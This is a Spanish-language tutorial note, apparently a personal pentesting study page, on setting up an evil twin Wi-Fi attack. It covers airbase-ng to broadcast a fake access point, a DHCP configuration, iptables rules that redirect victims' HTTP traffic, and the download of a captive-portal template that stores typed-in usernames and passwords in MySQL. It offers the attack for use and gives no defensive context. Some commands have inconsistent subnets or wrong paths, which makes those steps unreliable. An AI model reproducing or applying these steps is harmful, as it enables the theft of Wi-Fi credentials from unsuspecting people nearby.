Si bien sabemos el eviltwin consiste en montar una copia del AP victima con un portal cautivo, aqui puede saber mas sobre esto [[EvilTwin]].

Nota: Esto solo funciona para las tarjeta de red alpha, en mi caso es una tp-link, por lo tanto no funciana, pero existe una utilidad  **EvilTrust by s4vitar** que tira de [[HostAPD]].

Primero vamos a configurar un archivo dhcpd.conf (*demonio*) para que los clientes se les asigne una direccion IP.

	cd /etc
	nano dhcpd.conf

	authoritative;
	#Tiempo minimo/maximo para asignar una IP
	default-lease-time 600;
	max-lease-time 7200;
	subnet 192.168.2.128 netmask 255.255.255.128 {
		option subnet-mask 255.255.255.128;
		option broadcast-address 192.168.2.255;
		option routers 192.168.2.129;
		option domain-name-servers 8.8.8.8;
		range 192.168.2.130 192.168.2.140;
	}
	
Despues descargaremos un portal cautivo, lo ubicamos en */var/www/html*, ya que estas rutas son publicas.

	wget https://cdn.rootsh3ll.com/u/20180724181033/Rogue_AP.zip
	unzip Rogue_AP.zip
	mv Rogue_AP/* .

Ahora para poder visualizar este portal cautivo tendremos que enceder *Apache2* y *MySQL* para guardar el user y passwords ingresados.

	service apache2 start && service mysql start

Ahora si bien la plantilla cuenta con un archivo php donde se encuetra la conexion a la base datos, ahora debemos de realizar ciertas acciones en MySQL para la conexion.

1. Create database
2. Create table
3. Create user and assign privileges
Esto se encuentra en el archivo *dbconnect.php*.


Ahora montaremos el AP con *airbase-ng*.

	airbase-ng -e wifi-gratis -c 6 -P wlan0mon

-P *Responde a todos los probe request*
-c *Canal del AP*

Y ya veremos el AP transmitiendo Becon request, si bien *airbase-ng* nos pide una interfaz de red llamada *at0*, esta intefaz sera utilizada en modo [[Protocolos de Internet#Briged | Briged]] entre *wlan0mon* y *at0* para que al momento de que el usuario se conecte al AP sea redirigido al portal cuativo.

Ahora si vamos crear la interfaz de red *at0*, esto se tiene que realizar cuando el AP montado con airbase este activo.


	ifconfig at0 192.168.2.129 netmask 255.255.255.128


- 192.168.2.129 *Opcion de routers en el archivo dhcpd.conf*
- 255.255.255.128 *NetMask configurada en el dhcpd.conf*

Ahora añadimos esto a route.

	route add -net 192.168.100.128 netmask 255.255.255.128 gw 192.168.100.129

Ahora toca habilitar el enrutamiento en el equipo para que las reglas que asignemos por iptables tengan sentido para esto emitimos un 1.

	echo 1 > /proc/sys/net/ip_forward

Con esto ya podemos vizualizar la interfaz con ` ifconfig `

Ahora toca definir las reglas *Iptables* es decir que queremos hacer cuando el usuario trate de navegar, aplicaremos una limpieza por si hubiera algunas reglas creadas.

``` bash
iptables --flush
iptables --table nat --flush
iptables --delete-chain
iptables --table nat --delete-chain

#Vizualizamos las reglas activas
iptables -S
iptables -L
```

La intencion es que cuando se conecte a nuestro AP responda la interfaz *eth0* (es con la que podemos navergar) para que puedan acceder a internet.

Ahora cuando definiremos las reglas para que cuando el usuario entre a una pagina http o https enviarlo a portal cautivo.

	iptables --table nat --append POSTROUTING --out-interface eth0 -j MASQUERADE

-eth0 *Indicamos la out interface la que va a nutrir at0*

Ahora indicamos como debe de nutrir a la interfaz *at0*.

	iptables --append FORWARD --in-interface at0 -j ACCEPT
		#Indicamos la rediccion del puerto 80 al portal cautivo
	iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination $(hostname | awk '{print $1}')

Ahora nos ubicamos en */etc* para aplicar el *dhcp*.

	dhcp -cf /etc/dhcpd.conf -pf /var/run/dhcp.pid at0

-cf *Indicamos el archivo de configuracion*
-pf *Indicamos la ruta donde guardaremos nuestro PID*

Al correr el dhcp puede que nos algunas cosas, por ejemplo:
1. Eliminar el archivo PID.
2. Crear un archivo en una ruta determinada.
